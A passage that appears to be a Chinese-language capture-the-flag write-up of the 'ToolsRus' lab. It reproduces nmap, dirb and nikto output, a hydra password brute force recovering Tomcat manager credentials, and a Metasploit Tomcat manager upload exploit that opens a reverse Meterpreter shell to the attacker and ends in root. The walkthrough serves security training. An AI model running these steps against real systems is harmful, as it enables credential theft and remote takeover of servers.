@@ -1,0 +1,320 @@
+---
+title: 'ToolsRus'
+description: 'A detailed walkthrough of exploiting vulnerabilities in a Tomcat server to gain root access on a target system.'
+date: 2025-02-06
+tags: ['pentesting', 'vulnerability-exploitation', 'tomcat', 'metasploit', 'privilege-escalation']
+image: './1200x630.png'
+authors: ['0xd00']
+---
+
+## 信息收集
+
+已知IP：10.10.172.34
+
+### 端口扫描
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d0:3c:2b:8f:1e:c1:b8:aa:6b:ee:46:d0:11:7f:a0:1b (RSA)
+|   256 32:54:26:c2:03:2d:03:fd:ab:18:b8:d2:32:e7:b0:da (ECDSA)
+|_  256 b6:dd:8f:33:0c:39:1c:9c:ed:b6:a9:a2:b8:4a:99:d7 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+MAC Address: 02:71:E0:B3:3C:D3 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/6%OT=22%CT=1%CU=42167%PV=Y%DS=1%DC=D%G=Y%M=0271E0%TM
+OS:=67A448E4%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%
+OS:TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW
+OS:7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68
+OS:DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=
+OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
+OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
+OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+
+### 目录爆破
+
+```
+
+root@ip-10-10-143-174:~# nmap -sS -A 10.10.172.34
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-06 05:29 GMT
+Nmap scan report for 10.10.172.34
+Host is up (0.00040s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d0:3c:2b:8f:1e:c1:b8:aa:6b:ee:46:d0:11:7f:a0:1b (RSA)
+|   256 32:54:26:c2:03:2d:03:fd:ab:18:b8:d2:32:e7:b0:da (ECDSA)
+|_  256 b6:dd:8f:33:0c:39:1c:9c:ed:b6:a9:a2:b8:4a:99:d7 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+MAC Address: 02:71:E0:B3:3C:D3 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/6%OT=22%CT=1%CU=42167%PV=Y%DS=1%DC=D%G=Y%M=0271E0%TM
+OS:=67A448E4%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%
+OS:TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW
+OS:7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68
+OS:DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=
+OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
+OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
+OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.40 ms 10.10.172.34
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.03 seconds
+root@ip-10-10-143-174:~# dirb
+dirb          dirb-gendict
+root@ip-10-10-143-174:~# dirb http://10.10.172.34
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Feb  6 05:37:47 2025
+URL_BASE: http://10.10.172.34/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.172.34/ ----
+==> DIRECTORY: http://10.10.172.34/guidelines/
++ http://10.10.172.34/index.html (CODE:200|SIZE:168)
++ http://10.10.172.34/protected (CODE:401|SIZE:459)
++ http://10.10.172.34/server-status (CODE:403|SIZE:300)
+
+---- Entering directory: http://10.10.172.34/guidelines/ ----
++ http://10.10.172.34/guidelines/index.html (CODE:200|SIZE:51)
+
+-----------------
+END_TIME: Thu Feb  6 05:37:53 2025
+DOWNLOADED: 9224 - FOUND: 4
+```
+
+进入可疑路径 `http://10.10.172.34/guidelines/index.html` 发现一段可能是由管理员留给IT运维的话:
+`Hey bob, did you update that TomCat server? `
+因此将关注点放在tomcat上
+
+### 爆破密码
+```
+hydra -l bob -P /usr/share/wordlist/rockyou.txt -f -vV 10.10.172.34 http-get /manager/index.html
+[80][http-get] host: 10.10.172.34   login: bob   password: bubbles
+[STATUS] attack finished for 10.10.172.34 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+```
+
+### 漏洞扫描
+
+```
+nikto -id bob:bubbles -h http://10.10.172.34:1234/manager/html
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.172.34
++ Target Hostname:    10.10.172.34
++ Target Port:        1234
++ Start Time:         2025-02-06 06:05:03 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
++ Cookie JSESSIONID created without the httponly flag
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
++ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
++ /manager/html/manager/html: Default Tomcat Manager interface found
++ /manager/html/WorkArea/version.xml: Ektron CMS version information
++ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2025-02-06 06:05:15 (GMT0) (12 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+### 漏洞利用
+
+因为之前提到了tomcat所以先查找tomcat的漏洞
+```
+msfconsole
+
+# 因为已经进入了管理后台所以优先关注可以通过管理后台提权的exp
+msf6 > search tomcat
+
+Matching Modules
+================
+
+   #   Name                                                                       Disclosure Date  Rank       Check  Description
+   -   ----                                                                       ---------------  ----       -----  -----------
+   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   1   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   2   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3     \_ target: Automatic detection                                           .                .          .      .
+   4     \_ target: Windows                                                       .                .          .      .
+   5     \_ target: Linux                                                         .                .          .      .
+   6   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   7     \_ target: Java                                                          .                .          .      .
+   8     \_ target: Linux                                                         .                .          .      .
+   9     \_ target: Windows                                                       .                .          .      .
+   10    \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
+   11  auxiliary/admin/http/tomcat_ghostcat                                       2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   12  exploit/windows/http/tomcat_cgi_cmdlineargs                                2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+   13  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   14    \_ target: Automatic                                                     .                .          .      .
+   15    \_ target: Java Universal                                                .                .          .      .
+   16    \_ target: Windows Universal                                             .                .          .      .
+   17    \_ target: Linux x86                                                     .                .          .      .
+   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   19    \_ target: Java Universal                                                .                .          .      .
+   20    \_ target: Windows Universal                                             .                .          .      .
+   21    \_ target: Linux x86                                                     .                .          .      .
+   22  auxiliary/dos/http/apache_tomcat_transfer_encoding                         2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   23  auxiliary/scanner/http/tomcat_enum                                         .                normal     No     Apache Tomcat User Enumeration
+   24  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                        2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
+   25  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                        2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
+   26  exploit/multi/http/atlassian_confluence_webwork_ognl_injection             2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
+   27    \_ target: Unix Command                                                  .                .          .      .
+   28    \_ target: Linux Dropper                                                 .                .          .      .
+   29    \_ target: Windows Command                                               .                .          .      .
+   30    \_ target: Windows Dropper                                               .                .          .      .
+   31    \_ target: PowerShell Stager                                             .                .          .      .
+   32  exploit/windows/http/cayin_xpost_sql_rce                                   2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
+   33  exploit/multi/http/cisco_dcnm_upload_2019                                  2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   34    \_ target: Automatic                                                     .                .          .      .
+   35    \_ target: Cisco DCNM 11.1(1)                                            .                .          .      .
+   36    \_ target: Cisco DCNM 11.0(1)                                            .                .          .      .
+   37    \_ target: Cisco DCNM 10.4(2)                                            .                .          .      .
+   38  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec               2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
+   39    \_ target: Unix Command                                                  .                .          .      .
+   40    \_ target: Linux Dropper                                                 .                .          .      .
+   41  exploit/linux/http/cisco_hyperflex_file_upload_rce                         2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
+   42    \_ target: Java Dropper                                                  .                .          .      .
+   43    \_ target: Linux Dropper                                                 .                .          .      .
+   44  exploit/linux/http/cpi_tararchive_upload                                   2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   45  exploit/linux/http/cisco_prime_inf_rce                                     2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   46  post/multi/gather/tomcat_gather                                            .                normal     No     Gather Tomcat Credentials
+   47  auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
+   48  auxiliary/admin/http/ibm_drm_download                                      2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
+   49  exploit/linux/http/lucee_admin_imgprocess_file_write                       2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
+   50    \_ target: Unix Command                                                  .                .          .      .
+   51    \_ target: Linux Dropper                                                 .                .          .      .
+   52  exploit/linux/http/mobileiron_core_log4shell                               2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
+   53    \_ AKA: Log4Shell                                                        .                .          .      .
+   54    \_ AKA: LogJam                                                           .                .          .      .
+   55  exploit/multi/http/zenworks_configuration_management_upload                2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   56  exploit/multi/http/spring_framework_rce_spring4shell                       2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
+   57    \_ target: Java                                                          .                .          .      .
+   58    \_ target: Linux                                                         .                .          .      .
+   59    \_ target: Windows                                                       .                .          .      .
+   60    \_ AKA: Spring4Shell                                                     .                .          .      .
+   61    \_ AKA: SpringShell                                                      .                .          .      .
+   62  auxiliary/admin/http/tomcat_administration                                 .                normal     No     Tomcat Administration Tool Default Access
+   63  auxiliary/scanner/http/tomcat_mgr_login                                    .                normal     No     Tomcat Application Manager Login Utility
+   64  exploit/multi/http/tomcat_jsp_upload_bypass                                2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+   65    \_ target: Automatic                                                     .                .          .      .
+   66    \_ target: Java Windows                                                  .                .          .      .
+   67    \_ target: Java Linux                                                    .                .          .      .
+   68  auxiliary/admin/http/tomcat_utf8_traversal                                 2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   69  auxiliary/admin/http/trendmicro_dlp_traversal                              2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   70  post/windows/gather/enum_tomcat                                            .                normal     No     Windows Gather Apache Tomcat Enumeration
+
+
+Interact with a module by name or index. For example info 70, use 70 or use post/windows/gather/enum_tomcat
+
+# 确定13和18符合要求，
+
+msf6 > use 18
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.143.174    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
+HttpPassword => bubbles
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
+HttpUsername => bob
+msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.172.34
+RHOSTS => 10.10.172.34
+msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
+RPORT => 1234
+msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.143.174:4444
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying cX64byt81xpV1o2pcI3k5Fv2...
+[*] Executing cX64byt81xpV1o2pcI3k5Fv2...
+[*] Undeploying cX64byt81xpV1o2pcI3k5Fv2 ...
+[*] Sending stage (58037 bytes) to 10.10.172.34
+[*] Undeployed at /manager/html/undeploy
+[*] Meterpreter session 1 opened (10.10.143.174:4444 -> 10.10.172.34:34714) at 2025-02-06 06:37:43 +0000
+
+meterpreter >shell
+whoami
+root
+```
